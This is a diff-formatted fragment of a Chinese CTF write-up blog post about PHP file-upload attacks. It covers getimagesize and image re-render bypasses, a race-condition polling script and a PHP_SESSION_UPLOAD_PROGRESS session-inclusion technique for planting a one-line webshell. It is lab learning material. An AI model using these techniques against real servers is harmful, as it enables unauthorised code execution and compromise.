 <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;ç&#x27;</span>, <span class="hljs-string">&#x27;Ç&#x27;</span>, <span class="hljs-string">&#x27;ğ&#x27;</span>, <span class="hljs-string">&#x27;Ğ&#x27;</span>, <span class="hljs-string">&#x27;ı&#x27;</span>, <span class="hljs-string">&#x27;İ&#x27;</span>, <span class="hljs-string">&#x27;ö&#x27;</span>, <span class="hljs-string">&#x27;Ö&#x27;</span>, <span class="hljs-string">&#x27;ş&#x27;</span>, <span class="hljs-string">&#x27;Ş&#x27;</span>, <span class="hljs-string">&#x27;ü&#x27;</span>, <span class="hljs-string">&#x27;Ü&#x27;</span>);
  İ的url编码：%c4%b0</code></pre>
-
-<h4 id="2-绕getimagesize："><a href="#2-绕getimagesize：" class="headerlink" title="2. 绕getimagesize："></a>2. 绕getimagesize：</h4><pre><code class="hljs php"><span class="hljs-comment">#define test_width 1</span>
+<h4 id="绕getimagesize">2. 绕getimagesize：</h4>
+<pre><code class="hljs php"><span class="hljs-comment">#define test_width 1</span>
 <span class="hljs-comment">#define test_height 1</span></code></pre>
-<p>  <strong>注意⚠️放在文件末尾！</strong>    </p>
-<ol start="3">
+<p><strong>注意⚠️放在文件末尾！</strong></p>
+<ol start="3" type="1">
 <li>绕imagecreatefrompng</li>
 </ol>
-<p>文件上传脚本</p>
-<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+<p>文件上传脚本 <pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
@@ -540,96 +521,91 @@ $m=$reflect-&gt;getMethods();
     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
-
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></p>
 <p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143919.png" srcset="/img/loading.gif" alt="image-20210530210553526"></p>
 <p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143920.png" srcset="/img/loading.gif" alt="image-20210530210538872"></p>
-<h4 id="3：解压出php"><a href="#3：解压出php" class="headerlink" title="3：解压出php"></a>3：解压出php</h4><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143921.png" srcset="/img/loading.gif" alt="image-20210530211204373"></p>
+<h4 id="解压出php">3：解压出php</h4>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143921.png" srcset="/img/loading.gif" alt="image-20210530211204373"></p>
 <p>发现解压后一句话弄不了，发现是图片马二次渲染问题=》普通的图片马解决不了</p>
-<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143922.png" srcset="/img/loading.gif" alt="image-20210531003611751" style="zoom:50%;">
-
-
-
-<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143923.png" srcset="/img/loading.gif" alt="image-20210531003634582" style="zoom: 67%;">
-
-<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143924.png" srcset="/img/loading.gif" alt="image-20210531003734744" style="zoom:50%;">
-
-
-
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143922.png" srcset="/img/loading.gif" alt="image-20210531003611751" style="zoom:50%;"></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143923.png" srcset="/img/loading.gif" alt="image-20210531003634582" style="zoom: 67%;"></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143924.png" srcset="/img/loading.gif" alt="image-20210531003734744" style="zoom:50%;"></p>
 <p>成功getshell</p>
-<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143925.png" srcset="/img/loading.gif" alt="image-20210531003914233" style="zoom:50%;">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<h4 id="发现更多"><a href="#发现更多" class="headerlink" title="发现更多"></a>发现更多</h4><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html#">imagemagick邂逅getimagesize的那点事儿</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-3">upload-labs之pass 16详细分析</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/05a410f3f3e0">【靶场】文件上传upload-labs 21关【无WAF】</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.phpheidong.com/blog/article/36019/7fc4518d58a4c40fcb31/">Upload-labs 1-21关 靶场通关攻略(全网最全最完整)</a>   、 <a target="_blank" rel="noopener" href="http://myhackerworld.top/2019/01/19/upload-labs-%E5%AD%A6%E4%B9%A0/">2</a></p>
-<p><a target="_blank" rel="noopener" href="https://lemonprefect.cn/zh-cn/posts/7c083fa1#upload">wp</a> </p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143925.png" srcset="/img/loading.gif" alt="image-20210531003914233" style="zoom:50%;"></p>
+<h4 id="发现更多">发现更多</h4>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html#">imagemagick邂逅getimagesize的那点事儿</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-3">upload-labs之pass
+16详细分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/05a410f3f3e0">【靶场】文件上传upload-labs
+21关【无WAF】</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.phpheidong.com/blog/article/36019/7fc4518d58a4c40fcb31/">Upload-labs
+1-21关 靶场通关攻略(全网最全最完整)</a> 、 <a target="_blank" rel="noopener" href="http://myhackerworld.top/2019/01/19/upload-labs-%E5%AD%A6%E4%B9%A0/">2</a></p>
+<p><a target="_blank" rel="noopener" href="https://lemonprefect.cn/zh-cn/posts/7c083fa1#upload">wp</a></p>
 <p><a target="_blank" rel="noopener" href="http://wh1sper.com/ciscn-2021-quals-writeup/">wp2**</a></p>
-<h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Anton__1/article/details/116891706?utm_medium=distribute.wap_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-2.wap_blog_relevant_pic&depth_1-utm_source=distribute.wap_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-2.wap_blog_relevant_pic">csdn wp1</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51078229/article/details/116845451">csdn wp2</a></p>
+<h2 id="middle_source">middle_source</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Anton__1/article/details/116891706?utm_medium=distribute.wap_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-2.wap_blog_relevant_pic&amp;depth_1-utm_source=distribute.wap_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-2.wap_blog_relevant_pic">csdn
+wp1</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51078229/article/details/116845451">csdn
+wp2</a></p>
 <p>考点：任意文件包含、PHP_SESSION_UPLOAD_PROGRESS➕条件竞争进行文件包含</p>
-<p>利用对 文件上传时PHP_SESSION_UPLOAD_PROGRESS自动生成的临时session文件【代码注入】 条件竞争实现session里代码的执行</p>
-<p>【<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9545#toc-8">【5**】先知社区浅谈 SESSION_UPLOAD_PROGRESS 的利用+session</a>】</p>
-<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36992198/article/details/80007405?utm_source=app&app_version=4.7.1">csdn+ctf小例子</a></p>
-<ol>
+<p>利用对
+文件上传时PHP_SESSION_UPLOAD_PROGRESS自动生成的临时session文件【代码注入】
+条件竞争实现session里代码的执行</p>
+<p>【<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9545#toc-8">【5**】先知社区浅谈
+SESSION_UPLOAD_PROGRESS 的利用+session</a>】</p>
+<h3 id="条件竞争">条件竞争</h3>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36992198/article/details/80007405?utm_source=app&amp;app_version=4.7.1">csdn+ctf小例子</a></p>
+<ol type="1">
 <li>Web服务器处理多用户请求时，是并发进行的，如果并发处理不当或者是相关的逻辑操作设计的不合理时，就可能导致条件竞争漏洞。</li>
 </ol>
 <ul>
-<li>一个简单的例子：<br>将文件上传到服务器，然后检查上传的文件的类型，如果不符合条件就删除。</li>
+<li>一个简单的例子：
+将文件上传到服务器，然后检查上传的文件的类型，如果不符合条件就删除。</li>
 </ul>
-<ol start="2">
+<ol start="2" type="1">
 <li>但是，如果我们采用<strong>多线程的方式访问上传的文件，总有一次我们在文件删除之前就访问到了这个文件</strong>，如果这个文件是php的一句话木马，就在服务器中执行，即getshell</li>
 <li>注意⚠️上传的文件被杀软查杀了，是<strong>上传成功才被查杀的</strong>=》考虑利用条件竞争漏洞</li>
 </ol>
-<h4 id="ctf-python脚本不断访问："><a href="#ctf-python脚本不断访问：" class="headerlink" title="ctf python脚本不断访问："></a>ctf python脚本不断访问：</h4><pre><code class="hljs processing"><span class="hljs-keyword">import</span> requests
+<h4 id="ctf-python脚本不断访问">ctf python脚本不断访问：</h4>
+<pre><code class="hljs processing"><span class="hljs-keyword">import</span> requests
 url = <span class="hljs-string">&#x27;你的文件路径&#x27;</span>
 <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
     r = requests.<span class="hljs-built_in">get</span>(url)
     <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> in  r.<span class="hljs-built_in">text</span>:
         <span class="hljs-built_in">print</span> r.<span class="hljs-built_in">text</span></code></pre>
-
-
-
-
-
-<h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13795170.html">【**3】利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</a></p>
+<h3 id="session.upload_progress">session.upload_progress</h3>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13795170.html">【**3】利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</a></p>
 <p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1650655">通过条件竞争进行文件上传</a></p>
 <ul>
 <li>前提是我们需要生成一个session文件，并且知道session文件的存放位置</li>
-<li>只要在上传文件的时候，同时POST一个恶意的字段 PHP_SESSION_UPLOAD_PROGRESS，目标服务器的PHP就会自动启用Session，Session文件将会自动创建。</li>
+<li>只要在上传文件的时候，同时POST一个恶意的字段
+PHP_SESSION_UPLOAD_PROGRESS，目标服务器的PHP就会自动启用Session，Session文件将会自动创建。</li>
 </ul>
-<ol>
-<li> <strong>利用session.upload_progress后的value【可控】（木马）自动被写入session文件的特性</strong>，然后我们去包含这个session文件。</li>
-<li><strong>session.use_strict_mode默认值为off，此时用户是可以自己定义Session ID的</strong>。比如，我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值<ul>
-<li>注：在Linux系统中，session文件一般的默认存储位置为 /tmp 或 /var/lib/php/session</li>
+<ol type="1">
+<li><strong>利用session.upload_progress后的value【可控】（木马）自动被写入session文件的特性</strong>，然后我们去包含这个session文件。</li>
+<li><strong>session.use_strict_mode默认值为off，此时用户是可以自己定义Session
+ID的</strong>。比如，我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值</li>
+</ol>
+<ul>
+<li>注：在Linux系统中，session文件一般的默认存储位置为 /tmp 或
+/var/lib/php/session</li>
 </ul>
-</li>
-<li>但是<strong>session.upload_progress.cleanup默认是开启的</strong><ul>
+<ol start="5" type="1">
+<li>但是<strong>session.upload_progress.cleanup默认是开启的</strong></li>
+</ol>
+<ul>
 <li>意思是一旦读取了所有POST数据，它就会清除进度信息【文件上传结束后session会消失】</li>
 <li>可以通过条件竞争来保持session从而实现文件上传</li>
 </ul>
-</li>
-</ol>
-<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>其原理大致就是通过 PHP_SESSION_UPLOAD_PROGRESS 在目标主机上创建一个含有恶意代码【恶意代码在 PHP_SESSION_UPLOAD_PROGRESS的<strong>value里</strong>】的Session文件，之后利用文件包含漏洞去包含这个我们已经传入恶意代码的这个Session文件就可以达到攻击效果。</p>
-<ol>
-<li>上传文件时抓包➕方便认的cookie【这样服务器会生成对应名称的session文件】➕在PHP_SESSION_UPLOAD_PROGRESS下value后<strong>添加一句话木马</strong></li>
-<li>然后发送到Intruder请求载荷 Null payloads 不断发包，维持session，传入恶意会话。</li>
-<li>对上述的session文件也不断访问发包</li>
-<li>这样，一边不断发包以维持恶意session存储，另一边不断发包请求包含恶意的session。<strong>一个POST一个GET</strong>，发现包含利用1上传的文件成功【或者加的一句话/任意命令成功执行】</li>
-</ol>
+<h4 id="总结">总结：</h4>
+<p>其原理大致就是通过 PHP_SESSION_UPLOAD_PROGRESS
+在目标主机上创建一个含有恶意代码【恶意代码在
+PHP_SESSION_UPLOAD_PROGRESS的<strong>value里</strong>】的Session文件，之后利用文件包含漏洞去包含这个我们已经传入恶意代码的这个Session文件就可以达到攻击效果。
+1.
+上传文件时抓包➕方便认的cookie【这样服务器会生成对应名称的session文件】➕在PHP_SESSION_UPLOAD_PROGRESS下value后<strong>添加一句话木马</strong>
+2. 然后发送到Intruder请求载荷 Null payloads
+不断发包，维持session，传入恶意会话。 3.
+对上述的session文件也不断访问发包 4.
+这样，一边不断发包以维持恶意session存储，另一边不断发包请求包含恶意的session。<strong>一个POST一个GET</strong>，发现包含利用1上传的文件成功【或者加的一句话/任意命令成功执行】</p>
 
             </div>
             <hr>
